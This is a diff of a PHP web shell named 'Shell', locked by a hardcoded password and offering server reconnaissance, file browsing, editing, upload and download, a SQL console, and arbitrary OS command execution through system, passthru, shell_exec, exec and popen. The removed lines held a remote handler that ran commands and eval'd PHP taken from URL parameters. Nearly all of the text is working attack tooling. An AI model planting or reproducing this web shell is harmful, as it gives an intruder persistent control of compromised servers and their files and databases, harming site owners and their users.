@@ -1,57 +1,53 @@
 <?php 
 
-define("PASSWORD", "pass"); 
-define("COLOR", "dark");
+define("PASSWORD", "pass"); // password ( plain-tetx )
+define("STYLE", "dark"); // style ( dark / light )
 
-class CommonVars 
+
+function RootDir() 
+{ 
+	return getcwd() . DIRECTORY_SEPARATOR;
+}
+	
+function OS() 
+{ 
+	return strtoupper(substr(PHP_OS, 0, 3));
+}
+	
+function ThisFile() 
+{ 
+	return (isset($_GET['file']) && file_exists($_GET['file'])) ? $_GET['file'] : null;
+}
+	
+function ThisUrl() 
+{ 
+	return "http://" . $_SERVER["HTTP_HOST"] . $_SERVER["PHP_SELF"];
+}
+	
+function ThisPath() 
 {
-	public static function Root() 
-	{ 
-		return getcwd() . DIRECTORY_SEPARATOR;
+	if(!isset($_COOKIE["shell_path"]) || !is_dir($_COOKIE['shell_path'])) { 
+		setcookie("shell_path", RootDir(), time() + (60 * 60 * 24), "/"); 
+		return RootDir();
 	}
-	
-	public static function Url() 
-	{ 
-		return (empty($_SERVER['HTTPS']) ? "http://" : "https://") . $_SERVER["HTTP_HOST"] . $_SERVER["PHP_SELF"];
+	if(isset($_GET['path']) && is_dir($_GET['path'])) { 
+		setcookie("shell_path", $_GET['path'], time() + (60 * 60 * 24), "/"); 
+		return $_GET['path']; 
 	}
-	
-	public static function OS() 
-	{ 
-		return strtoupper(substr(PHP_OS, 0, 3));
-	}
-	
-	public static function File() 
-	{ 
-		return (isset($_GET['file']) && file_exists($_GET['file'])) ? $_GET['file'] : null;
-	}
-	
-	public static function Path() 
-	{
-		if(!isset($_COOKIE["shell_path"]) || !is_dir($_COOKIE['shell_path'])) { 
-			setcookie("shell_path", CommonVars::Root(), time() + (60 * 60 * 24), "/"); 
-			return CommonVars::Root();
-		}
-		if(isset($_GET['path']) && is_dir($_GET['path'])) { 
-			setcookie("shell_path", $_GET['path'], time() + (60 * 60 * 24), "/"); 
-			return $_GET['path']; 
-		}
-		return $_COOKIE["shell_path"]; 
-	}
+	return $_COOKIE["shell_path"]; 
 }
 
 class Shell 
 {
 	public function __construct() 
 	{
-		$this->Remote(); 
-		$this->Login();
 		$this->action = @$_GET["act"];
-		if(isset($_POST["download"])) FileDownloader($_POST['path']);
+		if(isset($_POST["download"]) && $this->Authenticated()) FileDownloader($_POST['path']);
 	}
 	
 	public function Login() 
 	{
-		if(isset($_COOKIE["shell_pass"]) && @$_COOKIE["shell_pass"] == PASSWORD) return; 
+		if($this->Authenticated()) return; 
 		?>
 		<html>
 		<form method="POST">
@@ -61,7 +57,7 @@ class Shell
 		<?php 
 		if(@$_POST["password"] == PASSWORD) {
 			setcookie("shell_pass", PASSWORD, time() + (60 * 60 * 24), "/");
-			header("Location: " . CommonVars::Url());
+			header("Location: " . ThisUrl());
 		} else {
 			exit();
 		}
@@ -69,24 +65,27 @@ class Shell
 	
 	public function Logout() 
 	{
-		setcookie("shell_pass", "", time() - (60 * 60));
-		setcookie("shell_path", "", time() - (60 * 60));
-		setcookie("shell_sql", "", time() - (60 * 60));
-		header("Location: " . CommonVars::Url()); 
+		setcookie("shell_pass", null, time() - (60 * 60), "/");
+		setcookie("shell_path", null, time() - (60 * 60), "/");
+		setcookie("shell_sql", null, time() - (60 * 60), "/");
+		header("Location: " . ThisUrl()); 
 	}
 	
 	public function Info() 
 	{
 		?>
 		<table>
-			<tr><th>OS: <?php echo @php_uname(); ?></th></tr>
-		</table>
-		<table>
 			<tr>
-				<th>Server: <?php echo @getenv('SERVER_SOFTWARE'); ?></th>
-				<th>Computer: <?php echo @getenv('COMPUTERNAME'); ?></th>
-				<th>User: <?php echo @get_current_user() . " / " . @gethostname(); ?></th>
-				<th>IP: <?php echo @getenv('SERVER_ADDR'); ?></th>
+				<th>OS: <?php echo @php_uname(); ?></th>
+				<th>Server: <?php echo getenv('SERVER_SOFTWARE'); ?></th>
+				<th></th>
+				<th></th>
+			</tr>
+			<tr>
+				<th>Computer: <?php echo getenv('COMPUTERNAME'); ?></th>
+				<th>Domain: <?php echo @php_uname('n'); ?></th>
+				<th>User: <?php echo @get_current_user(); ?></th>
+				<th>IP: <?php echo (getenv('LOCAL_ADDR') != null) ? getenv('LOCAL_ADDR') : getenv('SERVER_ADDR'); ?></th>
 			</tr>
 		</table>
 		<?php 
@@ -95,16 +94,16 @@ class Shell
 	public function Body()
 	{
 		if($this->action == "fbrowser") { 
-			$fbrowser = new FileBrowser(CommonVars::Path()); 
+			$fbrowser = new FileBrowser(ThisPath()); 
 			$fbrowser->Body();
 		} elseif($this->action == "feditor") { 
-			$feditor = new FileEditor((CommonVars::File() == null ? CommonVars::Path() : CommonVars::File())); 
+			$feditor = new FileEditor((ThisFile() == null ? ThisPath() : ThisFile())); 
 			$feditor->Action();
 			$feditor->Body(); 
 		} elseif($this->action == "fuploader") { 
-			FileUploader(CommonVars::Path()); 
+			FileUploader(ThisPath()); 
 		} elseif($this->action == "cmd") { 
-			Command::Body(); 
+			CommandBody(); 
 		} elseif($this->action == "sql") { 
 			$sql = new Database(); 
 			$sql->Query(); 
@@ -114,35 +113,11 @@ class Shell
 		}
 	}
 	
-	public function Remote() 
+	private function Authenticated() 
 	{
-		if(!isset($_GET["remote"]) || $_GET["password"] != PASSWORD) return;
-		$path = (isset($_GET["path"]) ? urldecode($_GET["path"]) : (isset($_POST["path"]) ? base64_decode($_POST["path"]) : CommonVars::Path()));
-		if(isset($_GET["cmd"]) || isset($_POST["cmd"])) {
-			$cmd = isset($_GET["cmd"]) ? urldecode($_GET["cmd"]) . "" : base64_decode($_GET["cmd"]); 
-			Command::RunCmd($cmd);
-		} elseif(isset($_GET["php"]) || isset($_POST["php"])) {
-			$php = isset($_GET["php"]) ? urldecode($_GET["php"]) . "" : base64_decode($_GET["php"]);
-			eval($php); 
-		} elseif(isset($_GET["info"]) || isset($_POST["info"])) {
-			echo CommonVars::OS() . " : " . @get_current_user() . "/" . @gethostname() . " : " . @getenv('SERVER_ADDR');
-		} elseif(isset($_GET["ls"]) || isset($_POST["ls"])) {
-			$ls = (new FileBrowser($path))->listDirsFiles();
-			if($ls != false) {
-				foreach($ls[0] as $d) echo "$d[1], $d[2], $d[3], $d[4]<br>";
-				foreach($ls[1] as $f) echo "$f[1], $f[2], $f[3], $f[4]<br>";
-			}
-		} elseif(isset($_GET["read"]) || isset($_POST["read"])) {
-			$fe = new FileEditor($path);
-			$fe->feRead();
-			echo ($fe->message != "") ? $fe->message : $fe->text;
-		} elseif(isset($_GET["ls"]) || isset($_POST["ls"])) {
-			$data = (isset($_GET["data"]) ? urldecode($_GET["data"]) : (isset($_POST["data"]) ? base64_decode($_POST["data"]) : ""));
-			$fe = new FileEditor($path);
-			$fe->feWrite($data); 
-			echo $fe->message;
-		}
-		exit();
+		if(!isset($_COOKIE["shell_pass"])) return false; 
+		if($_COOKIE["shell_pass"] != PASSWORD) return false; 
+		return true; 
 	}
 }
 
@@ -157,18 +132,19 @@ class FileBrowser
 	{
 		?>
 		<table class="fbrowser">
-			<tr style="<?php echo Colors(COLOR, "tr"); ?>">
+			<tr style="<?php echo Colors("tr"); ?>">
 				<th>CWD: <?php echo $this->CWD(); ?></th>
-				<th class="menu" ><a href='?act=fbrowser&path=<?php echo CommonVars::Root(); ?>'>Home</a></th>
+				<th class="menu" ><a href='?act=fbrowser&path=<?php echo RootDir(); ?>'>Home</a></th>
 				<th>Drives: <?php echo $this->Drives(); ?></th>
 				<th></th>
 				<th></th>
 			</tr>
-			<tr style="<?php echo Colors(COLOR, "tr"); ?>">
+			<tr style="<?php echo Colors("tr"); ?>">
 				<th>Name</th><th>Size</th><th>Permissions</th><th>Created</th><th>Modified</th>
 			</tr>
-			<tr style="<?php echo Colors(COLOR, "tr"); ?>">
-				<td><a href='?act=fbrowser&path=<?php echo dirname($this->path) . DIRECTORY_SEPARATOR; ?>'>..</a></td><td></td><td></td><td></td><td></td>
+			<tr style="<?php echo Colors("tr"); ?>">
+				<td><a href='?act=fbrowser&path=<?php echo dirname($this->path) . DIRECTORY_SEPARATOR; ?>'>..</a></td>
+				<td></td><td></td><td></td><td></td>
 			</tr> 
 			<?php echo $this->DirsFiles(); ?>
 		</table>
@@ -203,10 +179,10 @@ class FileBrowser
 			if($i == '.' || $i == '..') continue;
 			$path = $this->path . $i; 
 			if(is_dir($this->path . $i)) { 
-				$dirs[] = [ $i, $path, "Dir", $this->getUidGid($path), $this->getPerms($path), $this->getCMDate($path), $this->getCMDate($path, 9) ]; 
+				$dirs[] = array($i, $path, "Dir", $this->getUidGid($path), $this->getPerms($path), $this->getCMDate($path), $this->getCMDate($path, 9)); 
 			}
 			if(is_file($this->path . $i)) { 
-				$files[] = [ $i, $path, $this->getSize($path), $this->getUidGid($path), $this->getPerms($path), $this->getCMDate($path), $this->getCMDate($path, 9) ]; 
+				$files[] = array($i, $path, $this->getSize($path), $this->getUidGid($path), $this->getPerms($path), $this->getCMDate($path), $this->getCMDate($path, 9)); 
 			}
 		} 
 		return array($dirs, $files);
@@ -236,9 +212,10 @@ class FileBrowser
 	
 	private function getSize($path) 
 	{
-		if(stat($path)[7] > (1024 * 1024)) return (int)(stat($path)[7] / (1024 * 1024)) . " MB";
-		elseif(stat($path)[7] > 1024) return (int)(stat($path)[7] / 1024) . " KB";
-		else return stat($path)[7] . " B"; 
+		$stat = stat($path); 
+		if($stat[7] > (1024 * 1024)) return (int)($stat[7] / (1024 * 1024)) . " MB";
+		elseif($stat[7] > 1024) return (int)($stat[7] / 1024) . " KB";
+		else return $stat[7] . " B"; 
 	}
 
 	private function getPerms($path) 
@@ -248,12 +225,14 @@ class FileBrowser
 
 	private function getUidGid($path) 
 	{
-		return stat($path)[4] . "/" . stat($path)[5]; 
+		$stat = stat($path); 
+		return $stat[4] . "/" . $stat[5]; 
 	}
 
 	private function getCMDate($path, $d=10) 
 	{
-		return date("d/m/Y H:i", stat($path)[$d]); 
+		$stat = stat($path);
+		return date("d/m/Y H:i", $stat[$d]); 
 	}
 }
 
@@ -271,7 +250,7 @@ class FileEditor
 		if(isset($_POST["read"])) $this->feRead();
 		elseif(isset($_POST["write"])) $this->feWrite($_POST['content']);
 		elseif(isset($_POST["remove"])) $this->message = $this->feRemove($this->path) ? "Deleted." : "Failed.";
-		elseif(isset($_POST["rename"])) $this->feRename((CommonVars::File() == null ? CommonVars::Path() : CommonVars::File())); 
+		elseif(isset($_POST["rename"])) $this->feRename((ThisFile() == null ? ThisPath() : ThisFile())); 
 		elseif(isset($_POST["mkdir"])) $this->feMkdir(); 
 	}
 	
@@ -287,8 +266,7 @@ class FileEditor
 			<input name="mkdir" type="submit" value="mkdir >>">
 			<input name="download" type="submit" value="dnload >>">
 			&nbsp;&nbsp;<b><?php echo $this->message; ?></b>
-			<br>
-			<pre><textarea name="content"><?php echo $this->text; ?></textarea></pre>
+			<pre class="sep"><textarea name="content"><?php echo $this->text; ?></textarea></pre>
 		</form>
 		<?php
 	}
@@ -337,8 +315,8 @@ class FileEditor
 
 function FileDownloader($file) 
 {
-	header("Content-Disposition: attachment; filename=" . @basename($file) . "\"");
-	header("Content-Length: " . @stat($file)[7] . "\"");
+	header("Content-Disposition: attachment; filename=\"" . @basename($file) . "\"");
+	header("Content-Length: \"" . @filesize($file) . "\"");
 	header("Content-Type: application/octet-stream;");
 	@readfile($file);
 	exit();
@@ -360,48 +338,12 @@ function FileUploader($path)
 	}
 }
 
-class Command 
-{
-	public static function Body()
-	{ 
-		?>
-		<form method="POST">
-			<input name="cmd" type="text" size="80" value="">
-			<input name="run" type="submit" value=" >>">
-		</form>
-		<?php 
-		if(!isset($_POST["run"])) return; 
-		$cmd = @$_POST["cmd"] . " 2>&1";
-		echo "<pre>";
-		Command::RunCmd($cmd); 
-		echo "</pre>"; 
-	}
-
-	public static function RunCmd($cmd) 
-	{	
-		if(is_callable("system")) { 
-			system($cmd);
-		} elseif(is_callable("passthru")) { 
-			passthru($cmd);
-		} elseif(is_callable("shell_exec")) { 
-			echo shell_exec($cmd);
-		} elseif(is_callable("exec")) {
-			exec($cmd, $out);
-			foreach($out as $o) echo $o, "<br>";
-		} elseif(is_callable("popen")) {
-			if(($pop = popen($cmd, 'r')) !== false) return;
-			while(!feof($pop)) echo fread($pop, 2096);
-			pclose($pop);
-		} else { 
-			echo "Failed."; 
-		}
-	}
-}
-
 class Database 
 {
-	private $ms_dbs = "SELECT name FROM master.dbo.sysdatabases"; 
 	private $my_dbs = "SHOW DATABASES;"; 
+	private $ms_dbs = "SELECT name FROM master.dbo.sysdatabases"; 
+	private $my_tbl = "SHOW TABLES;"; 
+	private $ms_tbl = "SELECT * FROM INFORMATION_SCHEMA.TABLES;"; 
 	
 	public function __construct() 
 	{
@@ -415,7 +357,7 @@ class Database
 		$this->db = (isset($get_db) ? $get_db : (isset($_POST['db']) ? $_POST['db'] : $cookies[3]));
 		$this->dbms = isset($_POST['dbms']) ? $_POST['dbms'] : $cookies[4];
 		$this->query = (isset($get_db) ? "SHOW TABLES;" : (isset($get_table) ? "SELECT * FROM $get_table;" : $this->my_dbs));
-		if(isset($_POST["submit"])) $this->query = @$_POST['query'] != "" ? $_POST['query'] : ($this->dbms == "mssql" ? $this->ms_dbs : $this->my_dbs);
+		if(isset($_POST["submit"])) $this->query = ((@$_POST['query'] != "") ? $_POST['query'] : ($this->dbms == "mssql" ? $this->ms_dbs : $this->my_dbs));
 		$this->output = ""; 
 	}
 	
@@ -497,50 +439,93 @@ class Database
 			$cookie[] = (isset($_POST['host']) && @$_POST['host'] != "") ? $_POST['host'] : $values[0];
 			$cookie[] = (isset($_POST['user']) && @$_POST['user'] != "") ? $_POST['user'] : $values[1];
 			$cookie[] = (isset($_POST['pass']) && @$_POST['pass'] != "") ? $_POST['pass'] : $values[2];
-			$cookie[] = (isset($_POST['db']) && @$_POST['db'] != "") ? $_POST['db'] : $values[3];
+			$cookie[] = ((isset($_POST['db']) && @$_POST['db'] != "") ? $_POST['db'] : (isset($_GET['db']) ? $_GET['db'] : $values[3]));
 			$cookie[] = (isset($_POST['dbms']) && @$_POST['dbms'] != "") ? $_POST['dbms'] : $values[4]; 
 		}
 		setcookie("shell_sql", serialize($cookie), time() + (60 * 60 * 24), "/"); 
 	}
 }
 
-function Colors($tone="light", $part="color") 
-{
-	if($tone == "light") $colors = array("color"=>"#181818", "back"=>"#f0f8ff", "link"=>"#015fb2", "visited"=>"#00437e", "hover"=>"#ddefff" );
-	elseif($tone == "dark") $colors = array("color"=>"#ddefff", "back"=>"#181818", "link"=>"#ddefff", "visited"=>"#83c5ff", "hover"=>"#202020" );
-	if($part == "color") return $colors; 
-	elseif($part == "body" || $part == "table" || $part == "tr" || $part == "th" || $part == "td") return "color:" . $colors['color'] . "; background-color:" . $colors['back'] . ";"; 
-	elseif($part == "input") return ($tone == "light") ? "color:#ddefff; background-color:#202020 ;" : "color:" . $colors['back'] . "; background-color:" . $colors['color'] . ";"; 
-	elseif($part == "hover") return "color:" . $colors['color'] . "; background-color:" . $colors['hover'] . ";"; 
+function CommandBody()
+{ 
+	?>
+	<form method="POST">
+		<input name="cmd" type="text" size="80" value="cmd">
+		<input name="run" type="submit" value=" >>">
+	</form>
+	<?php 
+	if(isset($_POST["run"])) {  
+		$cmd = @$_POST["cmd"] . " 2>&1";
+		echo "<pre>";
+		RunCmd($cmd); 
+		echo "</pre>"; 
+	}
+}
+
+function RunCmd($cmd) 
+{ 
+	if(is_callable("system")) { 
+		system($cmd);
+	} elseif(is_callable("passthru")) { 
+		passthru($cmd);
+	} elseif(is_callable("shell_exec")) { 
+		echo shell_exec($cmd);
+	} elseif(is_callable("exec")) {
+		exec($cmd, $out);
+		foreach($out as $o) echo $o, PHP_EOL;
+	} elseif(is_callable("popen")) {
+		if(($pop = popen($cmd, 'r')) === false) return;
+		while(!feof($pop)) echo fread($pop, 2096);
+		pclose($pop);
+	} else { 
+		echo "Failed."; 
+	}
+}
+
+function Colors($part="color") 
+{ 
+	if(STYLE == "dark") $colors = array("color"=>"#ddefff", "back"=>"#181818", "link"=>"#ddefff", "visited"=>"#83c5ff", "hover"=>"#202020" );
+	else $colors = array("color"=>"#181818", "back"=>"#f0f8ff", "link"=>"#015fb2", "visited"=>"#00437e", "hover"=>"#ddefff" );
+	
+	if($part == "body" || $part == "table" || $part == "tr" || $part == "th" || $part == "td") { 
+		return " color:" . $colors['color'] . "; background-color:" . $colors['back'] . "; "; 
+	} elseif($part == "input") { 
+		if(STYLE == "dark") return " color:" . $colors['back'] . "; background-color:" . $colors['color'] . "; border:1px solid " . $colors['visited'] . "; "; 
+		else return " color:" . $colors['hover'] . "; background-color:#242424 ; border:1px solid " . $colors['link'] . "; ";
+	} elseif($part == "hover") { 
+		return " color:" . $colors['color'] . "; background-color:" . $colors['hover'] . "; "; 
+	} else {
+		return $colors;
+	}
 }
 
 ?>
 <?php $shell = new Shell(); ?>
-<?php ?>
-<?php ?>
+<?php $shell->Login(); ?>
+<?php $colors = Colors("color"); ?>
 <html>
 <head>
 	<title>Shell</title>
 	<style>
-		body { <?php echo Colors(COLOR, "body"); ?> text-align:left; padding:2px; font-size:12px; }
-		table { <?php echo Colors(COLOR, "table"); ?> border-collapse:collapse; width:100%; padding:2px; font-size:12px; }
+		body { <?php echo Colors("body"); ?> text-align:left; padding:2px; font-size:12px; }
+		table { <?php echo Colors("table"); ?> border-collapse:collapse; width:100%; padding:2px; font-size:12px; }
 		th { font-size:13px; text-align:left; padding:2px; }
 		td { font-size:12px; text-align:left; padding:2px; }
-		table.fbrowser tr { <?php echo Colors(COLOR, "tr"); ?> }
-		table.fbrowser tr:hover { <?php echo Colors(COLOR, "hover"); ?> } 
-		.sql { border:1px solid <?php echo Colors(COLOR)['color']; ?>; <?php echo Colors(COLOR, "table"); ?> width:100%; padding:2px; font-size:12px;}
-		.sql th { <?php echo Colors(COLOR, "th"); ?>  border:1px solid <?php echo Colors(COLOR)['color']; ?>;}
+		table.fbrowser tr { <?php echo Colors("tr"); ?> }
+		table.fbrowser tr:hover { <?php echo Colors("hover"); ?> } 
+		.sql { border:1px solid <?php echo $colors['color']; ?>; <?php echo Colors("table"); ?> width:100%; padding:2px; font-size:12px;}
+		.sql th { <?php echo Colors("th"); ?>  border:1px solid <?php echo $colors['color']; ?>;}
 		.sql td { font-size:12px; text-align:left; padding:2px; } 
-		.sql tr { <?php echo Colors(COLOR, "tr"); ?> }
-		.sql tr:hover { <?php echo Colors(COLOR, "hover"); ?> }
-		input { border:1px solid <?php echo Colors(COLOR)['color']; ?>; font-size:12px; padding:2px; <?php echo Colors(COLOR, "input"); ?> }
+		.sql tr { <?php echo Colors("tr"); ?> }
+		.sql tr:hover { <?php echo Colors("hover"); ?> }
+		input { <?php echo Colors("input"); ?> font-size:12px; padding:2px; }
 		textarea { width:100%; height:100%; }
 		div { padding:2px; }
 		.sep { padding:0px; }
-		a:link { color:<?php echo Colors(COLOR)['link']; ?>; }
-		a:visited { color:<?php echo Colors(COLOR)['visited']; ?>; }
+		a:link { color:<?php echo $colors['link']; ?>; }
+		a:visited { color:<?php echo $colors['visited']; ?>; }
 		.menu { text-align:left; padding:2px; font-size:13px; }
-		.menu a { color:<?php echo Colors(COLOR)['color']; ?>; text-decoration:none; }
+		.menu a { color:<?php echo $colors['color']; ?>; text-decoration:none; }
 	</style>
 </head>
 <body>
